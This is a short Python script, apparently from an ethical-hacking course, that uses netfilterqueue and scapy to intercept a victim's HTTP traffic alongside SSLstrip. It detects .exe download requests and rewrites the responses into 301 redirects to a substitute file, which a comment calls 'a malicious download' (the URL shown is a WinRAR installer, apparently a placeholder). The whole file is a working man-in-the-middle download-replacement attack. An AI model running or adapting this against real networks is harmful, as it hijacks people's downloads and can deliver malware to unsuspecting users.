import netfilterqueue
import scapy.all as scapy

# only works for http, not https
# SSLstrip is running on victim

ack_list = []


# changes the scapy packet's load to the specified one
def set_load(scapy_packet, load):

    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):

        packet_load = scapy_packet[scapy.Raw].load

        # check if user is requesting to downloading a file. port 10000 is for SSLstrip. 80 otherwise
        if scapy_packet[scapy.TCP].dport == 10000 and ".exe" in packet_load and "www.win-rar.com" not in packet_load:
            print("[+] exe request")
            scapy_packet.show()
            ack_list.append(scapy_packet[scapy.TCP].ack)

        # http response. seq num of response = ack num of request
        elif scapy_packet[scapy.TCP].sport == 10000 and scapy_packet[scapy.TCP].seq in ack_list:

            ack_list.remove(scapy_packet[scapy.TCP].seq)
            print(scapy_packet.show())
            print("[+] Replacing file...")

            # change the packet's load to a 301 response. Change url to a malicious download.
            modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar/wrar561.exe\n\n")

            packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()